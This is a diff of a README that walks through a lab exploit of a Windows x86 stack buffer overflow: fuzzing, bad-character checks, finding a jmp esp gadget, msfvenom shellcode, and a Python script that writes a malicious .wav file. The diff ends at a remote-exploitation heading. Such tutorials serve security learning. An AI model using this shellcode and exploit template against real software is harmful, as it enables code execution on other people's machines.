@@ -9,10 +9,25 @@ This is a small repo for Windows Stack-Based Buffer overflow(x86).
 * [Identify the vulnerable field](#reconnaissance)
 <br>
 
+* [Bad chars detection](#Bad-Chars)
+<br>
+
+* [Finding ret instruction](#Finding-ret-instruction)
+<br>
+
+* [Payload Creation](#Payload-creation)
+
+<br>
+
+* [Remote Exploitation](#Remote-exploitation)
+
+<br>
+
 # Lab Setup
 
 For the lab i will use a windows 10 machine with:
 <br>
+
 
 ## Decompiler and Debuger
 [Cutter](https://cutter.re/)
@@ -47,14 +62,16 @@ In the top left corner of the debugger just click file and the _attatch_ option 
 	
 ![process attach](./pic/attach-process.png)
 	
-after attaching the process we need to [fuzz](https://www.wired.com/2016/06/hacker-lexicon-fuzzing/) all the input fields that the programm expose.
+after attaching the process we need to [fuzz](https://www.wired.com/2016/06/hacker-lexicon-fuzzing/) all the input fields that the program expose.
 <br>
-If a programm exposes to many fields just go for the ones that expect the smaller input such as
+If a program exposes to many fields just go for the ones that expect the smaller input such as
 
 * Date
 * Name
 * selection fileds (y\n) (m\f)
 * File inputs
+<br>
+
 To fuzz those Fields i will send the most basic payload generated like this:
 ```bash
 python3 -c "print('A'*1000)" 
@@ -63,16 +80,16 @@ This is for creating file payloads:
 ```bash
 python3 -c "print('A'*1000, file=open('<file_name>', 'w'))" 
 ```
-Once we have sent the data if the programm crashes we need to check the $EIP register.
+Once we have sent the data if the program crashes we need to check the $EIP register.
 <br>
 
 If this register is overwrritten with `4141414141` we succesfully find a possible stack overflow field.
 <br>
 
-In fact by overwriting the $EIP (the 32 bit version of the `Istruction pointer`) we can controll what the programm will execute next.
+In fact by overwriting the $EIP (the 32 bit version of the `instruction pointer`) we can controll what the program will execute next.
 <br>
 
-This register keep track of the last istruction that was called so the programm can _return_ the value and continue the exection from the _address_ pointed from the $EIP.
+This register keep track of the last instruction that was called so the program can _return_ the value and continue the exection from the _address_ pointed from the $EIP.
 <br>
 
 Although we overwritten the $EIP we don't know how many chars we sent to trigger only the $EIP.
@@ -148,3 +165,206 @@ def eip_control():
 
 eip_control()	#call the function
 ```
+But before we set the $EIP address there is still one thing to check:
+
+# Bad Chars 
+
+When we inject the program field, our payload must avoid [control chars](https://en.wikipedia.org/wiki/Control_character); in fact they are non printable chars that tells the program what to do (like a string or file termination)
+<br>
+
+To test what chars we need to avoid we can create a test payload like this:
+<br>
+
+in ERC we need to run:
+```cmd
+ERC --bytearray
+```
+output:
+	
+![byte array](./pic/byte-array.png)
+	
+the command will also save theme in the working dir(IMPORTANT FOR LATER!).
+<br>
+
+Once we have that we can craft our text or file payload:
+```python
+def bad_chars():
+    all_chars = bytes([<byte_array>]) #add the byte array that we got from the ERC command
+    
+    offset = 4112 	#calculated offset
+    buffer = b"A"*offset
+    eip = b"B"*4 	#new eip address
+    payload = buffer + eip + all_chars 	#add the bad chars to the payload
+    
+    with open('chars.wav', 'wb') as f:
+        f.write(payload)	#write everything to a file or just print it
+
+bad_chars()
+```
+Once we have created the payload and the programm is crashed we should manually check the stack if some of the char is no longer present inside it;
+<br>
+
+But luckily for us ERC will do the dirty job for us.
+<br>
+
+We just need to find the address of the stack pointer($ESP) and run:
+```cmd
+ERC --compare <$ESP_address> C:\Users\%USERNAME%\Desktop\ByteArray_1.bin
+```
+If the output is something like this:
+	
+![detected bad chars](./pic/bad-chars.png)
+	
+The 0x00 very likely cutted the bytes after it so we need to test the payload without it.
+<br>
+
+To generate the test payload without bad chars we need to do:
+```cmd
+ERC --bytearray -bytes 0x00 #add or use ur bad-chars
+```
+and repeat the steps above to check.
+
+# Finding ret instruction
+
+Now we can overwrite the $EIP with an address of our choice, but how can we benefit from that?
+<br>
+
+how can we execute code?
+
+## Jumping to the stack
+
+To execute code, we will put code on-to the stack and map the $EIP to the $ESP this means that the next code that will be executed is the stack content (written by us).
+<br>
+
+!!be careful!!
+```
+Modern systems and programs are compiled with the NX bit on the stack or the DEP memory protection in Windows, which prevents executing any code written on the stack
+```
+<br>
+
+With that said we can try the exploit for the sake of learning.
+<br>
+
+Instead of overwriting the $EIP with $ESP (because contains 0x00) we can also write the instruction
+```
+jmp esp
+```
+that will do the same.
+<br>
+
+To do so we need to either locate:
+* the program .exe file
+* the program .dll library
+* any windows .dll that is imported
+<br>
+
+to find all the modules we can run:
+```cmd
+ERC --ModuleInfo
+```
+Is better to search for a library that has all the memory protection set to False; also it would be better to chose a
+library related to the executable as we are pretty shure that there will be no version problems.
+Once we have chosen the library in the symbols section
+we can double click on the library to see the instructions.
+<br>
+
+Now we can search with `Ctrl + f` the `jmp esp` instruction (also the `call esp` work for us)
+<br>
+
+We can also search for pattern that will result the same as `jmp esp` like(instruction followed by machine code translation in [online assembler](https://defuse.ca/online-x86-assembler.htm) or msf-nasm_shell):
+
+* PUSH ESP; RET (54C3) 
+* JMP ESP (FFE4)
+
+<br>
+
+With `Ctrl + b` we can search for hex patterns
+<br>
+
+!!THE MOST IMPORTANT PART IS THAT THE INSTRUCTION ADDRESS MUST NOT CONTAIN ANY BAD CHARS!!   
+
+# Payload creation
+
+This is the most important part where we craft our shell code to put on top-of the stack.
+<br>
+
+To craft our payload i will use msfvenom on a kali machine, here is a little payload example:
+```bash
+msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' -b '\x00'
+```
+output:
+```shell
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+Found 12 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 220 (iteration=0)
+x86/shikata_ga_nai chosen with final size 220
+Payload size: 220 bytes
+Final size of python file: 1100 bytes
+buf =  b""
+buf += b"\xbe\x3b\x8d\x37\xd4\xdb\xcf\xd9\x74\x24\xf4\x5f"
+buf += b"\x2b\xc9\xb1\x31\x31\x77\x13\x83\xef\xfc\x03\x77"
+buf += b"\x34\x6f\xc2\x28\xa2\xed\x2d\xd1\x32\x92\xa4\x34"
+buf += b"\x03\x92\xd3\x3d\x33\x22\x97\x10\xbf\xc9\xf5\x80"
+buf += b"\x34\xbf\xd1\xa7\xfd\x0a\x04\x89\xfe\x27\x74\x88"
+buf += b"\x7c\x3a\xa9\x6a\xbd\xf5\xbc\x6b\xfa\xe8\x4d\x39"
+buf += b"\x53\x66\xe3\xae\xd0\x32\x38\x44\xaa\xd3\x38\xb9"
+buf += b"\x7a\xd5\x69\x6c\xf1\x8c\xa9\x8e\xd6\xa4\xe3\x88"
+buf += b"\x3b\x80\xba\x23\x8f\x7e\x3d\xe2\xde\x7f\x92\xcb"
+buf += b"\xef\x8d\xea\x0c\xd7\x6d\x99\x64\x24\x13\x9a\xb2"
+buf += b"\x57\xcf\x2f\x21\xff\x84\x88\x8d\xfe\x49\x4e\x45"
+buf += b"\x0c\x25\x04\x01\x10\xb8\xc9\x39\x2c\x31\xec\xed"
+buf += b"\xa5\x01\xcb\x29\xee\xd2\x72\x6b\x4a\xb4\x8b\x6b"
+buf += b"\x35\x69\x2e\xe7\xdb\x7e\x43\xaa\xb1\x81\xd1\xd0"
+buf += b"\xf7\x82\xe9\xda\xa7\xea\xd8\x51\x28\x6c\xe5\xb3"
+buf += b"\x0d\x82\xaf\x9e\x27\x0b\x76\x4b\x7a\x56\x89\xa1"
+buf += b"\xb8\x6f\x0a\x40\x40\x94\x12\x21\x45\xd0\x94\xd9"
+buf += b"\x37\x49\x71\xde\xe4\x6a\x50\xbd\x6b\xf9\x38\x6c"
+buf += b"\x0e\x79\xda\x70"
+```
+Before sending the payload as it is after the $EIP address we need to add padding due to [stack-alignment](https://stackoverflow.com/questions/672461/what-is-stack-alignment) reasons; usually this padding should be tested as far as the shell code is executed without truncation but if u have plenty of buffer u can add 32 `NOP (0x90)` instruction and you should be safe pretty much everywhere.
+<br>
+
+Now we can finally craft our python exploit to create our malicious string or file (to convert the address in little Endian we can use python struct):
+```python
+from struct import pack
+
+def exploit():
+    # msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' -b '\x00' (write the command that generated the payload)
+    buf =  b""		#change with your shellcode
+	buf += b"\xbe\x3b\x8d\x37\xd4\xdb\xcf\xd9\x74\x24\xf4\x5f"
+	buf += b"\x2b\xc9\xb1\x31\x31\x77\x13\x83\xef\xfc\x03\x77"
+	buf += b"\x34\x6f\xc2\x28\xa2\xed\x2d\xd1\x32\x92\xa4\x34"
+	buf += b"\x03\x92\xd3\x3d\x33\x22\x97\x10\xbf\xc9\xf5\x80"
+	buf += b"\x34\xbf\xd1\xa7\xfd\x0a\x04\x89\xfe\x27\x74\x88"
+	buf += b"\x7c\x3a\xa9\x6a\xbd\xf5\xbc\x6b\xfa\xe8\x4d\x39"
+	buf += b"\x53\x66\xe3\xae\xd0\x32\x38\x44\xaa\xd3\x38\xb9"
+	buf += b"\x7a\xd5\x69\x6c\xf1\x8c\xa9\x8e\xd6\xa4\xe3\x88"
+	buf += b"\x3b\x80\xba\x23\x8f\x7e\x3d\xe2\xde\x7f\x92\xcb"
+	buf += b"\xef\x8d\xea\x0c\xd7\x6d\x99\x64\x24\x13\x9a\xb2"
+	buf += b"\x57\xcf\x2f\x21\xff\x84\x88\x8d\xfe\x49\x4e\x45"
+	buf += b"\x0c\x25\x04\x01\x10\xb8\xc9\x39\x2c\x31\xec\xed"
+	buf += b"\xa5\x01\xcb\x29\xee\xd2\x72\x6b\x4a\xb4\x8b\x6b"
+	buf += b"\x35\x69\x2e\xe7\xdb\x7e\x43\xaa\xb1\x81\xd1\xd0"
+	buf += b"\xf7\x82\xe9\xda\xa7\xea\xd8\x51\x28\x6c\xe5\xb3"
+	buf += b"\x0d\x82\xaf\x9e\x27\x0b\x76\x4b\x7a\x56\x89\xa1"
+	buf += b"\xb8\x6f\x0a\x40\x40\x94\x12\x21\x45\xd0\x94\xd9"
+	buf += b"\x37\x49\x71\xde\xe4\x6a\x50\xbd\x6b\xf9\x38\x6c"
+	buf += b"\x0e\x79\xda\x70"
+
+    offset = 4112	#change with your offset
+    buffer = b"A"*offset
+    eip = pack('<L', 0x00419D0B)  #change with your jmp esp address
+    nop = b"\x90"*32
+    payload = buffer + eip + nop + buf
+
+    with open('exploit.wav', 'wb') as f:	#change with your file name or text output
+        f.write(payload)
+exploit()
+```
+Once we have launched the attack we will gain a calc.exe (that we can substitute with a cmd.exe or powershell.exe)
+
+# Remote exploitation
+
+A buffer overflow attack is much more powerfull if its attack vector is the network.
